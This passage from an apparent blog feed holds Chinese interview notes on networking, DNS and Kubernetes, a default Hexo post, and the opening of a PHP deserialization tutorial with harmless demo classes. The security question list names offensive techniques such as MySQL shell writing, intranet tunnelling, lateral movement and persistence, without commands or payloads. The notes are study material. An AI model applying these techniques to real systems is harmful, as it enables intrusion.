(信锐)</h3>\n<blockquote>\n<p>可靠的接入层应提供以下主要特性：</p>\n<ul>\n<li>使用冗余引擎和冗余电源获得系统级冗余，为关键用户群提供高可靠性；</li>\n<li>与具备冗余系统的汇聚层进行双归属连接，获得缺省网关冗余，支持在汇聚层的主备交换机间快速实现故障切换；</li>\n<li>通过链路汇聚提高带宽利用率，同时降低复杂性；</li>\n<li>通过配置 802.1X，动态 ARP 检查及 IP 源地址保护等功能增加安全性，有效防止非法访问。</li>\n</ul>\n<p>接入层到汇聚层选择三角形组网，由于接入层三角形组网存在二层环路，所以需要在交换机上使能多生成树协议 MSTP。汇聚层交换机部署虚拟路由器冗余协议 VRRP，将 VRRP 组的虚拟 IP 地址作为服务器网关。</p>\n<p>汇聚层应使用与核心层相同结构的冗余节点备份连接，以实现最快速的路由收敛并避免黑洞产生。汇聚层做三层接入网关时，还需要通过 VRRP 等协议实现网关的冗余备份和流量的负载分担。汇聚层边界发生链路或节点故障时，收敛速度取决于缺省网关冗余与故障切换，通过合理地配置协议定时器，可达到秒级的收敛速度。</p>\n<p>汇聚层到核心层间采用 OSPF 等动态路由协议进行路由层面高可用保障。</p>\n<p>核心层设备作为网络的骨干，需要能提供快速的数据交换和极高的永续性。从备份和负载分担的角度可选用双核心或多核心；从单台设备考虑，选用交换性能和可靠性高的设备，支持双主控、电源冗余、风扇冗余、分布式转发等特性。并降低核心设备配置的复杂度，减少出现错误的几率。</p>\n<p>传统架构为保证网络高可靠性通常采用 MSTP+VRRP，这种组网需要在接入交换机与汇聚交换机间运行 MSTP 协议，管理和维护较复杂。但当接入交换机和汇聚交换机都采用 H3C IRF 智能弹性架构技术之后，可将每两台交换机（也可以是多台）配置成一个 IRF 堆叠组，两台汇聚交换机也配置成一个堆叠组，接入交换机与汇聚交换机之间通过捆绑链路连接，如图 3 所示。从逻辑上看，一个堆叠组就是一台设备，因此接入交换机和汇聚交换机间不存在二层环路，可以避免 MSTP 的配置管理，简化网络设计。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzE0OTM1NDM3L2FydGljbGUvZGV0YWlscy83NjYxMTM3Mw==\">(67 条消息) 网络的可靠性是设计出来的_半遮雨的博客 - CSDN 博客_网络可靠性</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25mbGEuY29tL2RpYW5uYW8vNTI5Mzg5Lmh0bWw=\">如何保证网络安全 (cnfla.com)</span></p>\n</blockquote>\n<h3 id=\"16dns\"><a class=\"markdownIt-Anchor\" href=\"#16dns\">#</a> 16.DNS</h3>\n<h4 id=\"dns原理端口特斯拉长亭\"><a class=\"markdownIt-Anchor\" href=\"#dns原理端口特斯拉长亭\">#</a> DNS 原理，端口 (特斯拉，长亭)</h4>\n<blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20161222114949313\" alt=\"img\" style=\"zoom:80%;\" />\n<p>1、在浏览器中输入 www . qq .com 域名，操作系统会先检查自己本地的 hosts 文件是否有这个网址映射关系，如果有，就先调用这个 IP 地址映射，完成域名解析。<br>\n2、如果 hosts 里没有这个域名的映射，则查找本地 DNS 解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。<br>\n3、如果 hosts 与本地 DNS 解析器缓存都没有相应的网址映射关系，首先会找 TCP/ip 参数中设置的首选 DNS 服务器，在此我们叫它本地 DNS 服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。<br>\n4、如果要查询的域名，不由本地 DNS 服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个 IP 地址映射，完成域名解析，此解析不具有权威性。<br>\n5、如果本地 DNS 服务器本地区域文件与缓存解析都失效，则根据本地 DNS 服务器的设置（是否设置转发器）进行查询，如果未用转发模式，本地 DNS 就把请求发至 13 台根 DNS，根 DNS 服务器收到请求后会判断这个域名 (.com) 是谁来授权管理，并会返回一个负责该顶级域名服务器的一个 IP。本地 DNS 服务器收到 IP 信息后，将会联系负责.com 域的这台服务器。这台负责.com 域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com 域的下一级 DNS 服务器地址 (<span class=\"exturl\" data-url=\"aHR0cDovL3FxLmNvbQ==\">http://qq.com</span>) 给本地 DNS 服务器。当本地 DNS 服务器收到这个地址后，就会找 http://qq.com 域服务器，重复上面的动作，进行查询，直至找到 www . qq .com 主机。<br>\n6、如果用的是转发模式，此 DNS 服务器就会把请求转发至上一级 DNS 服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根 DNS 或把转请求转至上上级，以此循环。不管是本地 DNS 服务器用是是转发，还是根提示，最后都是把结果返回给本地 DNS 服务器，由此 DNS 服务器再返回给客户机。<br>\n从客户端到本地 DNS 服务器是属于递归查询，而 DNS 服务器之间就是的交互查询就是迭代查询。</p>\n<p>下面我们列出几条常用的资源记录类型：</p>\n<p>SOA: Start Of Authority, 起始授权记录，一个区域解析库仅能有一个 SOA 记录，而且必须为解析库的第一条</p>\n<p>NS：Name Server，域名服务器，专用于标明当前区域的 DNS 服务器</p>\n<p>MX: Mail eXchange, 邮件交换器，MX 记录有优先级属性（0-99）</p>\n<p>A：internet Address,FQDN --&gt; IP，专用于正向解析，用于实现将 FQDN 解析为 IP 地址</p>\n<p>PTR: PoinTeR,IP --&gt; FQDN，专用于反向解析，将 IP 地址解析为 FQDN</p>\n<p>AAAA：FQDN --&gt; IPv6，专用于正向解析，将 FQDN 解析为 IPv6 地址</p>\n<p>CNAME: Canonical Name，别名记录</p>\n<p>TXT：Text</p>\n<p>SRV：Service</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poZW5ncWlqdW5fL2FydGljbGUvZGV0YWlscy81MzgxMTIyOQ==\">DNS 的工作原理及解析_zhengqijun_的博客 - CSDN 博客_dns 的工作原理</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83OTM1MDM5NQ==\">面试官：讲讲 DNS 的原理？ - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjE4Nzgx\">https://cloud.tencent.com/developer/article/1618781</span></p>\n<p>DNS 中也有一个地方用到了 TCP 协议。那就是区域传送！</p>\n<p>DNS 的规范规定了 2 种类型的 DNS 服务器，一个叫主 DNS 服务器，一个叫辅助 DNS 服务器。在一个区中主 DNS 服务器从自己本机的数据文件中读取该区的 DNS 数据信息，而辅助 DNS 服务器则从区的主 DNS 服务器中读取该区的 DNS 数据信息。当一个辅助 DNS 服务器启动时，它需要与主 DNS 服务器通信，并加载数据信息，这就叫做区传送（zone transfer）。 这种情况下，使用 TCP 协议。</p>\n<p>UDP 的 DNS 协议只要一个请求、一个应答就好了。而使用基于 TCP 的 DNS 协议要三次握手、发送数据以及应答、四次挥手。但是 UDP 协议传输内容不能超过 512 字节。不过客户端向 DNS 服务器查询域名，一般返回的内容都不超过 512 字节，用 UDP 传输即可。</p>\n</blockquote>\n<h4 id=\"递归和迭代区别这个目前还没人问我闲着蛋疼自己问自己\"><a class=\"markdownIt-Anchor\" href=\"#递归和迭代区别这个目前还没人问我闲着蛋疼自己问自己\">#</a> 递归和迭代区别 (这个目前还没人问，我闲着蛋疼自己问自己)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）递归查询</span><br><span class=\"line\">递归查询是一种DNS 服务器的查询模式，在该模式下DNS 服务器接收到客户机请求，必须使用一个准确的查询结果回复客户机。如果DNS 服务器本地没有存储查询DNS 信息，那么该服务器会询问其他服务器，并将返回的查询结果提交给客户机。</span><br><span class=\"line\"></span><br><span class=\"line\">（2）迭代查询</span><br><span class=\"line\">DNS 服务器另外一种查询方式为迭代查询，DNS 服务器会向客户机提供其他能够解析查询请求的DNS 服务器地址，当客户机发送查询请求时，DNS 服务器并不直接回复查询结果，而是告诉客户机另一台DNS 服务器地址，客户机再向这台DNS 服务器提交请求，依次循环直到返回查询的结果为止。</span><br></pre></td></tr></table></figure>\n<p>17. 二层相关</p>\n<p>stp 作用 (宏杉)</p>\n<p>super vlan (宏杉)</p>\n<p>stp 选举 (中科闻歌)</p>\n<p>18 链路聚合 (宏杉，中科曙光)</p>\n<p>19. 防火墙硬件实现，IPSEC 了解过吗 (中科曙光)</p>\n<p>防火墙用过吗，啥型号的，A 访问 B 时在防火墙配置单向还是双向，如果是交换机，需要配置单向还是双向 (中科闻歌)</p>\n<p>20. 项目题</p>\n<p>小型星星网络</p>\n<p>1. 确定网络设备</p>\n<p>2. 交换机设备和接口数量，交换机选型 (吞吐量)</p>\n<h3 id=\"21dockerk8s\"><a class=\"markdownIt-Anchor\" href=\"#21dockerk8s\">#</a> 21.docker/k8s</h3>\n<h4 id=\"k8s四层网络架构\"><a class=\"markdownIt-Anchor\" href=\"#k8s四层网络架构\">#</a> k8s 四层网络架构</h4>\n<blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2423834-20210810140224965-314287464.png\" alt=\"img\"></p>\n<p><strong>Node 节点网络</strong></p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">底层基础设施支持节点主机之间网络的互通</span><br></pre></td></tr></table></figure>\n<p><strong>Pod 网络</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">能够相互做IP寻址、相互通讯</span><br></pre></td></tr></table></figure>\n<p><strong>Service</strong></p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个service背后往往是由多个pod组成的集群</span><br><span class=\"line\">由此引入了服务发现以及负载均衡等问题</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MjAzODU2OTg=\">深入理解 K8S 网络原理上 - 知乎 (zhihu.com)</span></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2423834-20210811115056926-1067408095.png\" alt=\"img\"></p>\n</blockquote>\n<p>中型</p>\n<p>大型</p>\n<p>ping 丢包</p>\n<h2 id=\"0x02-安全岗总结\"><a class=\"markdownIt-Anchor\" href=\"#0x02-安全岗总结\">#</a> 0x02 安全岗总结</h2>\n<p>1. 反序列化相关</p>\n<p>PHP 反序列化的魔法方法，wakeup 绕过 (理想)</p>\n<p>shrio 反序列化，fastjson 反序列化，struct S062 (深信服)</p>\n<p>java 反序列化 (深信服)</p>\n<p>2. 逻辑漏洞类</p>\n<p>逻辑漏洞任意邮箱注册怎么修复 (理想)</p>\n<p>登录框有啥漏洞 (安天)</p>\n<p>3.XSS 类</p>\n<p>富文本编辑器 XSS 怎么解决 (理想)</p>\n<p>说说看 xss (长亭)</p>\n<p>4.SQL 注入类</p>\n<p>SQL 注入怎么防，PDO 在 order by 场景怎么防 (理想)</p>\n<p>sql 注入有几种 (深信服)</p>\n<p>union select 后面可以加 insert 吗，union select 叫啥名字 (深信服)</p>\n<p>怎么通过数据库获取系统权限，mysql，sqlserver (深信服)</p>\n<p>mysql 写 shell 命令 (深信服)</p>\n<p>堆叠注入原理，和 union select 有啥区别 (深信服)</p>\n<p>报错注入语句 (深信服)</p>\n<p>时间盲注原理，语句 (深信服)</p>\n<p>5. 入侵排查怎么查，netstat 怎么看，怎么找进程 (理想，安天)</p>\n<p>6.discuz 漏洞复现 (可能因为我简历里写了)(理想)</p>\n<p>7.cookie 对单个参数长度限制 (理想)</p>\n<p>8. 出现 0day，资产排查 (理想)</p>\n<p>10. 文件上传 shell 成功但不能连接，怎么办 (深信服)</p>\n<p>11. 内网渗透相关</p>\n<p>内网隧道怎么搭，earthworm 三种模式 (深信服)</p>\n<p>内网横向 (深信服)</p>\n<p>wmin 端口，横向之后啥权限 (深信服)</p>\n<p>12. 权限维持 (深信服)</p>\n<p>13.waf 是干啥的，哪一层的 (长亭)</p>\n<p>14. 工具使用类</p>\n<p>nmap 参数，操作系统 (理想)</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/10/16/hello-world/",
            "url": "http://example.com/2022/10/16/hello-world/",
            "title": "Hello World",
            "date_published": "2022-10-16T02:45:40.741Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/08/16/Unserialize/",
            "url": "http://example.com/2022/08/16/Unserialize/",
            "title": "反序列化",
            "date_published": "2022-08-16T05:38:45.000Z",
            "content_html": "<h1 id=\"unserialize\"><a class=\"markdownIt-Anchor\" href=\"#unserialize\">#</a> Unserialize</h1>\n<h2 id=\"1php\"><a class=\"markdownIt-Anchor\" href=\"#1php\">#</a> 1.php</h2>\n<h3 id=\"类与对象\"><a class=\"markdownIt-Anchor\" href=\"#类与对象\">#</a> 类与对象</h3>\n<p>类是定义一系列属性和操作的模板，而对象，就是把属性进行实例化，完事交给类里面的方法，进行处理。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class people&#123;</span><br><span class=\"line\">   //定义类属性（类似变量）,public 代表可见性（公有）</span><br><span class=\"line\">    public $name = &#x27;joker&#x27;;</span><br><span class=\"line\">   //定义类方法（类似函数）</span><br><span class=\"line\">   public function smile()&#123;</span><br><span class=\"line\">        echo $this-&gt;name.&quot; is smile...\\n&quot;;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$psycho = new people(); //根据people类实例化对象</span><br><span class=\"line\">$psycho-&gt;smile();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"魔法方法\"><a class=\"markdownIt-Anchor\" href=\"#魔法方法\">#</a> 魔法方法</h3>\n<table>\n<thead>\n<tr>\n<th>方法名</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>__construct</td>\n<td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td>\n</tr>\n<tr>\n<td>__destruct</td>\n<td>析构函数，和构造函数相反，在对象不再被使用时 (将所有该对象的引用设为 null) 或者程序退出时自动调用</td>\n</tr>\n<tr>\n<td>__toString</td>\n<td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如 echo 打印出对象就会调用此方法</td>\n</tr>\n<tr>\n<td>__wakeup()</td>\n<td>使用 unserialize 时触发，反序列化恢复对象之前调用该方法</td>\n</tr>\n<tr>\n<td>__sleep()</td>\n<td>使用 serialize 时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组 (该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td>\n</tr>\n<tr>\n<td>__destruct()</td>\n<td>对象被销毁时触发</td>\n</tr>\n<tr>\n<td>__call()</td>\n<td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td>\n</tr>\n<tr>\n<td>__callStatic()</td>\n<td>在静态上下文中调用不可访问的方法时触发</td>\n</tr>\n<tr>\n<td>__get()</td>\n<td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td>\n</tr>\n<tr>\n<td>__set()</td>\n<td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td>\n</tr>\n<tr>\n<td>__isset()</td>\n<td>当对不可访问属性调用 isset () 或 empty () 时触发</td>\n</tr>\n<tr>\n<td>__unset()</td>\n<td>当对不可访问属性调用 unset () 时触发</td>\n</tr>\n<tr>\n<td>__invoke()</td>\n<td>当脚本尝试将对象调用为函数时触发</td>\n</tr>\n</tbody>\n</table>\n<p>额外提一下__tostring 的具体触发场景：</p>\n<blockquote>\n<p>(1) echo(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>o</mi><mi>b</mi><mi>j</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">/</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">obj) / print(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">)</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span></span></span></span>obj) 打印时会触发</p>\n<p>(2) 反序列化对象与字符串连接时</p>\n<p>(3) 反序列化对象参与格式化字符串时</p>\n<p>(4) 反序列化对象与字符串进行<mark>比较时（PHP 进行</mark>比较的时候会转换参数类型）</p>\n<p>(5) 反序列化对象参与格式化 SQL 语句，绑定参数时</p>\n<p>(6) 反序列化对象在经过 php 字符串函数，如 strlen ()、addslashes () 时</p>\n<p>(7) 在 in_array () 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用</p>\n<p>(8) 反序列化的对象作为 class_exists () 的参数的时候</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    class animal &#123;</span><br><span class=\"line\">        private $name = &#x27;caixukun&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">        public function sleep()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo $this-&gt;name . &quot; is sleeping...\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __wakeup()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__wakeup()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__construct()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __destruct()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__destruct()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __toString()&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__toString()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __set($key, $value)&#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__set()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public function __get($key) &#123;</span><br><span class=\"line\">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class=\"line\">            echo &quot;调用了__get()方法\\n&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $ji = new animal();</span><br><span class=\"line\">    $ji-&gt;name = 1;</span><br><span class=\"line\">    echo $ji-&gt;name;</span><br><span class=\"line\">    $ji-&gt;sleep();</span><br><span class=\"line\">    $ser_ji = serialize($ji);</span><br><span class=\"line\">    //print_r($ser_ji);</span><br><span class=\"line\">    print_r(unserialize($ser_ji))</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//最后调用的结果是：</span><br><span class=\"line\">调用了__construct()方法</span><br><span class=\"line\">调用了__set()方法</span><br><span class=\"line\">调用了__get()方法</span><br><span class=\"line\">caixukun is sleeping...</span><br><span class=\"line\">调用了__wakeup()方法 animal Object ( [name:animal:private] =&gt; caixukun )</span><br><span class=\"line\">调用了__destruct()方法</span><br><span class=\"line\">调用了__destruct()方法</span><br></pre></td></tr></table></figure>\n<h3 id=\"序列化与反序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化与反序列化\">#</a> 序列化与反序列化</h3>\n<p>在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到 mysql 数据库中时，我们时常需要将数组进行序列号操作。</p>\n<p>php 序列化（serialize）：是将变量转换为可保存或传输的字符串的过程</p>\n<p>php 反序列化（unserialize）：就是在适当的时候把这个字符串再转化成原来的变量使用</p>\n<h4 id=\"序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化\">#</a> 序列化</h4>\n<p><strong>需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化</strong>。</p>\n<ul>\n<li>使用 public 修饰进行序列化后，变量 $team 的长度为 4，正常输出。</li>\n<li>使用 private 修饰进行序列化后，会在变量 $team_name 前面加上类的名称，在这里是 object，并且长度会比正常大小多 2 个字节，也就是 9+6+2=17。</li>\n<li>使用 protected 修饰进行序列化后，会在变量 $team_group 前面加上 *，并且长度会比正常大小多 3 个字节，也就是 10+3=13。</li>\n</ul>\n<p>通过对比发现，在受保护的成员前都多了两个字节，受保护的成员在序列化时规则：</p>\n<blockquote>\n<ol>\n<li>\n<p>受 Private 修饰的私有成员，序列化时: \\x00 + [私有成员所在类名] + \\x00 [变量名]</p>\n</li>\n<li>\n<p>受 Protected 修饰的成员，序列化时：\\x00 + * + \\x00 + [变量名]</p>\n</li>\n</ol>\n<p>其中，&quot;\\x00&quot; 代表 ASCII 为 0 的值，即空字节，&quot;*&quot; 必不可少。</p>\n</blockquote>\n<p>验证一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class object&#123;</span><br><span class=\"line\">    public $team = &#x27;joker&#x27;;</span><br><span class=\"line\">    private $team_name = &#x27;hahaha&#x27;;</span><br><span class=\"line\">    protected $team_group = &#x27;biubiu&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hahaha()&#123;</span><br><span class=\"line\">        $this-&gt;$team_members = &#x27;奥力给&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$object = new object();</span><br><span class=\"line\">echo serialize($object);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">O:6:&quot;object&quot;:3:&#123;s:4:&quot;team&quot;;s:5:&quot;joker&quot;;s:17:&quot;objectteam_name&quot;;s:6:&quot;hahaha&quot;;s:13:&quot;*team_group&quot;;s:6:&quot;biubiu&quot;;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">如果我们使用urlencode输出时</span><br><span class=\"line\">O%3A6%3A%22object%22%3A3%3A%7Bs%3A4%3A%22team%22%3Bs%3A5%3A%22joker%22%3Bs%3A17%3A%22%00object%00team_name%22%3Bs%3A6%3A%22hahaha%22%3Bs%3A13%3A%22%00%2A%00team_group%22%3Bs%3A6%3A%22biubiu%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">就能很明显的看到%00和*了</span><br><span class=\"line\"></span><br><span class=\"line\">以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。值得一提的是，类方法并不会参与到实例化里面。</span><br></pre></td></tr></table></figure>\n<h4 id=\"反序列化\"><a class=\"markdownIt-Anchor\" href=\"#反序列化\">#</a> 反序列化</h4>\n<p>反序列化的话，就依次根据规则进行反向复原。</p>\n<p>这边定义一个字符串，然后使用反序列化函数 unserialize 进行反序列化处理，最后使用 var_dump 